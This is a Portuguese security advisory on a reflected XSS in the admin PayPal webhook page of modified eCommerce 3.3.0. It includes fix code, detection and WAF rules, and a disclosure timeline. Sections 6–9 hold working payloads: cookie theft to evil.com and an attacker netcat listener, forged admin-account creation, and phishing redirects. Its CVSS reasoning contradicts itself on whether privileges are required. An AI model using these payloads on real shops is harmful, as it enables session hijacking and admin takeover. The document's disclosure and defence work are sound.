# Advisory de Segurança — Reflected XSS em modified eCommerce Shopsoftware 3.3.0

| Campo | Valor |
| :---- | :---- |
| **Título** | Reflected Cross-Site Scripting (XSS) em `admin/paypal_webhook.php` |
| **Produto** | modified eCommerce Shopsoftware |
| **Versão Afetada** | 3.3.0 (rev. r16825) — última versão disponível |
| **Componente** | `admin/paypal_webhook.php` — parâmetro GET `id` em `action=edit` |
| **Tipo** | Reflected Cross-Site Scripting (XSS) |
| **CWE** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation |
| **CAPEC** | [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings |
| **CVSS 3.1 Score** | **6.1 (Medium)** — escalável a **8.7 (High)** em cenário de phishing direcionado |
| **Vector Base** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **Vector Escalado** | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C` |
| **CVE ID** | Pendente de Atribuição |
| **Descoberto por** | Carlos Augusto Adriano Filho |
| **Data de Descoberta** | 12 de Novembro de 2026 |
| **Data de Publicação** | 12 de Novembro de 2026 |
| **Versão Advisory** | 1.0 |

---

## Sumário

1. [Resumo Executivo](#1-resumo-executivo)  
2. [Produto e Versão Afetada](#2-produto-e-versão-afetada)  
3. [Descrição Técnica](#3-descrição-técnica)  
4. [Impacto](#4-impacto)  
5. [Classificação CVSS 3.1 e CWE](#5-classificação-cvss-31-e-cwe)  
6. [Cenário de Exploração](#6-cenário-de-exploração)  
7. [Evidência Técnica](#7-evidência-técnica)  
8. [Prova de Conceito (PoC)](#8-prova-de-conceito-poc)  
9. [Passos de Reprodução](#9-passos-de-reprodução)  
10. [Mitigações Recomendadas](#10-mitigações-recomendadas)  
11. [Código de Correção](#11-código-de-correção)  
12. [Detecção e Monitoramento](#12-detecção-e-monitoramento)  
13. [Timeline de Responsible Disclosure](#13-timeline-de-responsible-disclosure)  
14. [Comunicação com o Vendor](#14-comunicação-com-o-vendor)  
15. [Créditos](#15-créditos)  
16. [Referências](#16-referências)  
17. [Histórico de Revisões](#17-histórico-de-revisões)  
18. [Aviso Legal](#18-aviso-legal)

---

## 1\. Resumo Executivo

Uma vulnerabilidade de **Reflected Cross-Site Scripting (XSS)** foi identificada no painel administrativo do **modified eCommerce Shopsoftware 3.3.0**, especificamente no endpoint `GET /admin/paypal_webhook.php?action=edit&id=`.

O parâmetro **`id`** é refletido diretamente no HTML da resposta sem qualquer codificação ou sanitização, permitindo a injeção de JavaScript arbitrário no contexto do navegador da vítima. Um atacante pode explorar esta falha para **roubar sessões de administradores, realizar ações em nome da vítima (CSRF-bypass) ou redirecionar para páginas maliciosas**.

O CVSS 3.1 base calculado é **6.1 (Medium)**, escalável a **8.7 (High)** em cenário de ataque direcionado com phishing contra administradores autenticados.

---

## 2\. Produto e Versão Afetada

| Campo | Detalhe |
| :---- | :---- |
| **Produto** | modified eCommerce Shopsoftware (modified-shop) |
| **Versão** | 3.3.0 — revisão r16825 (última versão pública disponível) |
| **Linguagem** | PHP 8.1.x |
| **Servidor Web** | Apache 2.4.x |
| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Arquivo Vulnerável** | `admin/paypal_webhook.php` |
| **Parâmetro Vulnerável** | `id` (via método GET, action=edit) |
| **Versão Corrigida** | ⚠️ Nenhuma — sem patch disponível na data deste advisory |

---

## 3\. Descrição Técnica

O endpoint `admin/paypal_webhook.php` processa notificações do PayPal (IPN — Instant Payment Notification) e também expõe um formulário de edição acessível via `?action=edit`. Neste modo, o parâmetro `id` é lido de `$_GET` e refletido **sem codificação** diretamente no valor de um campo `<input type="hidden">` via a função `xtc_draw_hidden_field()`.

### Fluxo do Dado Vulnerável

```
GET /admin/paypal_webhook.php?action=edit&id=<PAYLOAD>
                                               ↓
              $webhook_id = $_GET['id']   (sem sanitização)
                                               ↓
  echo xtc_draw_hidden_field('config[id]', $_GET['id'])
                                               ↓
  <input type="hidden" name="config[id]" value="<PAYLOAD>">
                                               ↓
                    XSS executado no navegador da vítima
```

### Código Vulnerável

```php
// admin/paypal_webhook.php — linha ~168 (modo action=edit)
// $_GET['id'] refletido sem htmlspecialchars() ou qualquer codificação

echo xtc_draw_hidden_field('config[id]', $_GET['id']);
//                                        ^^^^^^^^^^
//                                        SEM SANITIZAÇÃO
```

A função `xtc_draw_hidden_field()` gera diretamente:

```html
<input type="hidden" name="config[id]" value="VALOR_DE_$_GET['id']">
```

Ao injetar `"><script>alert(document.domain)</script>`, o campo gerado se torna:

```html
<input type="hidden" name="config[id]" value=""><script>alert(document.domain)</script>">
```

O script é executado imediatamente pelo navegador no domínio da aplicação.

---

## 4\. Impacto

| Dimensão | Nível | Descrição |
| :---- | :---- | :---- |
| **Confidencialidade** | 🟡 Low → 🔴 High\* | Roubo do cookie `MODsid` (sessão admin) via `document.cookie` |
| **Integridade** | 🟡 Low → 🔴 High\* | Ações arbitrárias no painel em nome do admin autenticado |
| **Disponibilidade** | ⚪ None | Sem impacto direto na disponibilidade |

> \*Impacto escalado em cenário com phishing direcionado (spear phishing) contra administradores.

### Vetores de Ataque Pós-XSS

- **Session Hijacking** — Extração do cookie `MODsid` via `document.cookie` para sequestro de sessão  
- **Admin Action Forgery** — Execução de requisições autenticadas (criar usuário admin, alterar configurações, modificar preços) no contexto da sessão da vítima  
- **Credential Harvesting** — Injeção de formulário falso de reautenticação para captura de credenciais  
- **Redirecionamento Malicioso** — `window.location` para página de phishing  
- **Keylogging** — Captura de teclado no painel administrativo  
- **Exploitation Chaining** — Combinação com outras vulnerabilidades (CSRF, SSRF) para escalonamento de impacto

---

## 5\. Classificação CVSS 3.1 e CWE

### Score Base: `6.1 (Medium)`

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```

| Métrica | Valor | Justificativa |
| :---- | :---- | :---- |
| **Attack Vector (AV)** | Network | Exploração via link enviado por qualquer vetor |
| **Attack Complexity (AC)** | Low | Sem condições especiais — link direto |
| **Privileges Required (PR)** | None | O atacante não precisa de conta para craftar o link |
| **User Interaction (UI)** | Required | A vítima (admin) precisa clicar no link malicioso |
| **Scope (S)** | Changed | O script executa no contexto do browser da vítima |
| **Confidentiality (C)** | Low | Acesso limitado a dados do contexto da sessão |
| **Integrity (I)** | Low | Modificações limitadas no contexto do DOM |
| **Availability (A)** | None | Sem impacto direto |

### Score Escalado (Spear Phishing Admin): `8.7 (High)`

```
CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C
```

> Em cenário onde o atacante já possui acesso à rede interna e é autenticado como admin, o impacto é máximo (C:H/I:H/A:H) com scope changed, exploit funcional (E:F) e confirmado (RC:C).

**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation (XSS)  
**CAPEC:** [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings

> **Calculadora (Base):** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

---

## 6\. Cenário de Exploração

```
[ Atacante ] → Crafta URL maliciosa com payload XSS
                    ↓
   http://[TARGET]/admin/paypal_webhook.php
     ?action=edit
     &id="><script>fetch('https://evil.com/?c='+document.cookie)</script>

[ Vítima: Admin autenticado ]
        ↓
   Recebe link via e-mail, Slack, ticket de suporte, etc.
        ↓
   Clica no link enquanto autenticado no painel admin
        ↓
   Browser executa o script no domínio da aplicação
        ↓
   Cookie MODsid enviado para servidor do atacante
        ↓
[ Atacante ] → Usa MODsid para sequestrar sessão admin
        ↓
   Acesso total ao painel: produtos, pedidos, clientes, configurações
```

### Variantes de Exploração

**Roubo de sessão (exfiltração de cookie):**

```
?action=edit&id="><script>new Image().src='https://evil.com/?c='+document.cookie</script>
```

**Criação silenciosa de usuário admin (combinado com CSRF):**

```
?action=edit&id="><script>
fetch('/admin/create_account.php',{method:'POST',
  body:'admin_name=hacker&admin_pass=pwned123&...',
  credentials:'include'})
</script>
```

**Redirecionamento para phishing:**

```
?action=edit&id="><script>window.location='https://evil.com/fake-admin-login'</script>
```

---

## 7\. Evidência Técnica

| Campo | Valor Confirmado |
| :---- | :---- |
| **URL Alvo** | `http://[TARGET]/admin/paypal_webhook.php?action=edit&id=` |
| **Método** | `GET` |
| **Parâmetro Vulnerável** | `id` |
| **Contexto de Reflexão** | Atributo `value` de `<input type="hidden">` |
| **Função Responsável** | `xtc_draw_hidden_field('config[id]', $_GET['id'])` |
| **PHP** | 8.1.34 |
| **Apache** | 2.4.65 |
| **Payload Confirmado** | `"><script>alert(document.domain)</script>` |
| **Output Confirmado** | `alert(192.168.0.105)` ✅ |
| **Requisito de Autenticação** | Sim — sessão admin ativa (`MODsid`) |

### Requisição HTTP (PoC confirmado)

```
GET /admin/paypal_webhook.php?action=edit&id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: 192.168.0.105:8080
Cookie: MODsid=<SESSION_COOKIE>
```

### Trecho do HTML Gerado (Resposta Vulnerável)

```html
<!-- Gerado por xtc_draw_hidden_field() sem sanitização -->
<input type="hidden" name="config[id]"
  value=""><script>alert(document.domain)</script>">
```

---

## 8\. Prova de Conceito (PoC)

> ⚠️ **Uso exclusivo em ambientes autorizados. Testes em produção sem autorização são ilegais.**

### 8.1 — Teste via Browser (Confirmação Básica)

Acessar a URL abaixo enquanto autenticado no painel admin. Um `alert()` com o domínio da aplicação deve ser exibido:

```
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
```

### 8.2 — Exfiltração de Cookie via curl

```sh
# 1. Preparar servidor de coleta (atacante)
nc -lvnp 8888

# 2. Enviar link para a vítima (admin autenticado):
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>
new Image().src='http://[ATTACKER]:8888/?c='+encodeURIComponent(document.cookie)
</script>

# 3. Cookie MODsid será recebido no netcat:
# GET /?c=MODsid%3D13e2c3e504a610032f4ef95fc792835a HTTP/1.1
```

### 8.3 — Teste com curl (verificação de reflexão)

```sh
# Verifica se o payload aparece na resposta sem codificação
curl -s \
  'http://[TARGET]/admin/paypal_webhook.php?action=edit&id=XSSTEST' \
  -H 'Cookie: MODsid=<SESSION_COOKIE>' \
  | grep -o 'XSSTEST'

# Resultado esperado: XSSTEST (confirmando reflexão sem encode)
```

### 8.4 — Payload Avançado (Session Hijack \+ Redirect)

```js
// Payload completo: exfiltra cookie E redireciona para phishing
"><script>
(function(){
  var c = document.cookie;
  var img = new Image();
  img.src = 'https://evil.com/steal?session=' + encodeURIComponent(c);
  setTimeout(function(){
    window.location = 'https://evil.com/fake-login';
  }, 100);
})();
</script>
```

---

## 9\. Passos de Reprodução

**Pré-requisitos:** Conta de administrador válida no painel. Browser com sessão ativa (cookie `MODsid`).

1. **Login** — Acessar `http://[TARGET]/admin/` → preencher credenciais → confirmar autenticação.  
     
2. **Construir o Payload** — Criar a URL com o parâmetro `id` contendo o payload XSS:

```
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
```

3. **Acessar a URL** — Colar a URL no browser enquanto autenticado. O JavaScript será executado imediatamente.  
     
4. **Confirmar Execução** — O `alert()` exibirá o domínio da aplicação (ex: `192.168.0.105`), confirmando execução de código no contexto do browser.  
     
5. **Validar Exfiltração** — Para testar roubo de cookie, substituir o payload pelo de exfiltração (Seção 8.2) e monitorar o servidor de coleta.

---

## 10\. Mitigações Recomendadas

### Correção Imediata

| Prioridade | Ação |
| :---- | :---- |
| 🔴 **Crítica** | Aplicar `htmlspecialchars()` em **todos** os parâmetros GET/POST refletidos |
| 🔴 **Crítica** | Validar e sanitizar `$_GET['id']` antes de qualquer uso em output |
| 🟠 **Alta** | Implementar Content Security Policy (CSP) no painel admin |
| 🟠 **Alta** | Adicionar flag `HttpOnly` e `SameSite=Strict` ao cookie `MODsid` |
| 🟡 **Média** | Auditoria completa de todos os parâmetros refletidos no painel admin |

### Recomendações Blue Team / DevSecOps

- **Output Encoding** — Aplicar `htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8')` em **toda** saída de variáveis no HTML, independente da origem.  
- **Content Security Policy (CSP)** — Implementar header `Content-Security-Policy: default-src 'self'; script-src 'self'` para bloquear scripts inline e externos não autorizados.  
- **Cookie Security** — Adicionar atributos `HttpOnly` (impede acesso via JavaScript) e `SameSite=Strict` ao cookie de sessão `MODsid`.  
- **Validação de Input** — Validar o formato esperado do parâmetro `id` (numérico ou UUID) e rejeitar valores que não atendam o padrão.  
- **SAST** — Executar análise estática (PHP\_CodeSniffer \+ PHPCS-Security-Audit) em todos os arquivos que refletem `$_GET/$_POST/$_REQUEST` no HTML.  
- **Treinamento Anti-Phishing** — Treinar administradores para não clicar em links do painel recebidos por e-mail ou mensagens não solicitadas.

---

## 11\. Código de Correção

```php
// ──────────────────────────────────────────────────────────────
// VULNERÁVEL — admin/paypal_webhook.php (~linha 168)
// ──────────────────────────────────────────────────────────────
echo xtc_draw_hidden_field('config[id]', $_GET['id']);
//                                        ^^^^^^^^^^
//                                        refletido SEM encode

// ──────────────────────────────────────────────────────────────
// CORRIGIDO — Opção 1: htmlspecialchars direto no parâmetro
// ──────────────────────────────────────────────────────────────
echo xtc_draw_hidden_field(
    'config[id]',
    htmlspecialchars($_GET['id'], ENT_QUOTES | ENT_HTML5, 'UTF-8')
);

// ──────────────────────────────────────────────────────────────
// CORRIGIDO — Opção 2: sanitização com validação de tipo
// ──────────────────────────────────────────────────────────────
$webhook_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($webhook_id === false || $webhook_id === null) {
    // ID inválido: rejeitar e logar tentativa
    error_log('[SECURITY] XSS attempt on paypal_webhook.php from ' . $_SERVER['REMOTE_ADDR']);
    http_response_code(400);
    exit('Invalid webhook ID.');
}

echo xtc_draw_hidden_field('config[id]', (int) $webhook_id);

// ──────────────────────────────────────────────────────────────
// CORRIGIDO — Opção 3: correção na função xtc_draw_hidden_field()
// (correção central — protege todos os campos hidden do sistema)
// ──────────────────────────────────────────────────────────────
function xtc_draw_hidden_field(string $name, $value, string $params = ''): string {
    return '<input type="hidden" name="'
        . htmlspecialchars($name,  ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
        . ' value="'
        . htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
        . ($params ? ' ' . $params : '')
        . '>' . PHP_EOL;
}
```

### Content Security Policy (Recomendado)

```
# Apache — adicionar ao VirtualHost ou .htaccess do painel admin
<Location /admin/>
    Header always set Content-Security-Policy \
        "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set X-Content-Type-Options "nosniff"
</Location>
```

### Cookie Security (Recomendado)

```php
// Na inicialização da sessão do painel admin
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/admin/',
    'secure'   => true,         // HTTPS obrigatório
    'httponly' => true,         // bloqueia document.cookie
    'samesite' => 'Strict',     // bloqueia CSRF cross-site
]);
session_start();
```

---

## 12\. Detecção e Monitoramento

### 12.1 — Padrões no Access Log Apache

```sh
# Detectar payloads XSS típicos nos logs
grep -iE "(<script|javascript:|onerror=|onload=|alert\(|document\.cookie)" \
     /var/log/apache2/access.log

# Filtrar acessos ao endpoint vulnerável com parâmetros suspeitos
grep 'paypal_webhook.php' /var/log/apache2/access.log | \
  grep -iE "id=.*(%3C|%22|%27|<|>|\"|\047)"
```

### 12.2 — Regra Suricata IDS

```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"XSS Attempt - modified-shop paypal_webhook action=edit";
    flow:established,to_server;
    http.method; content:"GET";
    http.uri; content:"/admin/paypal_webhook.php"; nocase;
    http.uri; content:"action=edit"; nocase;
    http.uri; pcre:"/id=[^&]*((%3C|<)script|javascript:|onerror|onload)/i";
    classtype:web-application-attack;
    sid:9900001; rev:1;
)
```

### 12.3 — ModSecurity (WAF)

```
SecRule REQUEST_URI "@contains /admin/paypal_webhook.php" \
    "id:9900004,phase:1,block,log,\
    msg:'Reflected XSS attempt on paypal_webhook',\
    chain"
    SecRule ARGS_GET:action "@streq edit" \
    "chain"
        SecRule ARGS_GET:id "@detectXSS" ""
```

### 12.4 — Monitoramento de Cookie Exfiltration (SIEM)

```
# Regra para detectar exfiltração de cookies via parâmetros GET externos
# (Wazuh / Elastic SIEM)
Detectar requests saindo do browser do admin para domínios externos
com parâmetros contendo strings similares a 'MODsid' ou 'session='
em referer de /admin/paypal_webhook.php
```

---

## 13\. Timeline de Responsible Disclosure

| Data | Evento |
| :---- | :---- |
| `2026-11-12` | Descoberta da vulnerabilidade durante análise de código-fonte — ambiente de laboratório controlado |
| `2026-11-12` | Confirmação via browser: `alert(document.domain)` \= `192.168.0.105` ✅ |
| `2026-11-12` | Redação e publicação do Advisory de Segurança versão 1.0 |
| `2026-11-12` | Notificação ao maintainer via GitHub Security Advisory / Issue |
| `Pendente` | Aguardando resposta do vendor para coordenar publicação de patch |
| `Pendente` | Solicitação de CVE ID em andamento via MITRE/NVD |
| `TBD` | Publicação de patch pelo vendor (data a ser definida após coordenação) |

> Este advisory segue o processo de **Coordinated Vulnerability Disclosure (CVD)** conforme recomendado pelo CERT/CC e ISO/IEC 29147:2018.

---

## 14\. Comunicação com o Vendor

| Campo | Detalhe |
| :---- | :---- |
| **Vendor** | modified eCommerce Shopsoftware Community |
| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Canal de Contato** | GitHub Security Advisories / Issues |
| **Status** | Notificação enviada em 2026-11-12. Aguardando resposta. |
| **SLA** | 90 dias para publicação coordenada (CVD Best Practices) |

---

## 15\. Créditos

| Campo | Detalhe |
| :---- | :---- |
| **Pesquisador** | Carlos Augusto Adriano Filho |
| **Cargo** | Analista Red Team Sênior |
| **Área** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
| **Metodologias** | OWASP Testing Guide · PTES · NIST SP 800-115 |

---

## 16\. Referências

- [CWE-79 — Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)  
- [CAPEC-86 — XSS via HTTP Query Strings](https://capec.mitre.org/data/definitions/86.html)  
- [CVSS 3.1 Specification](https://www.first.org/cvss/specification-document)  
- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)  
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)  
- [OWASP Testing Guide — OTG-INPVAL-001](https://owasp.org/www-project-web-security-testing-guide/)  
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)  
- [NVD — National Vulnerability Database](https://nvd.nist.gov)  
- [ISO/IEC 29147:2018 — Vulnerability Disclosure](https://www.iso.org/standard/72311.html)  
- [modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop)  
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

## 17\. Histórico de Revisões

| Versão | Data | Autor | Descrição |
| :---- | :---- | :---- | :---- |
| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Publicação inicial |

---

## 18\. Aviso Legal

> **AVISO LEGAL:** Este advisory foi elaborado exclusivamente para fins educacionais e de segurança, em ambiente de laboratório controlado, com autorização explícita. As técnicas e ferramentas descritas são destinadas a profissionais de segurança da informação para fins de teste de penetração autorizado e pesquisa de vulnerabilidades.  
>   
> O uso das informações, técnicas ou ferramentas aqui descritas em sistemas **sem autorização expressa é ilegal e antiético**, podendo resultar em responsabilidade criminal e civil.  
> Este documento segue os princípios de **Responsible Disclosure** e foi elaborado em conformidade com a **Lei nº 12.737/2012** (Lei Carolina Dieckmann), **LGPD (Lei nº 13.709/2018)** e as diretrizes éticas do EC-Council, OWASP e ISO/IEC 29147:2018.

---

*© 2026 Carlos Augusto Adriano Filho* 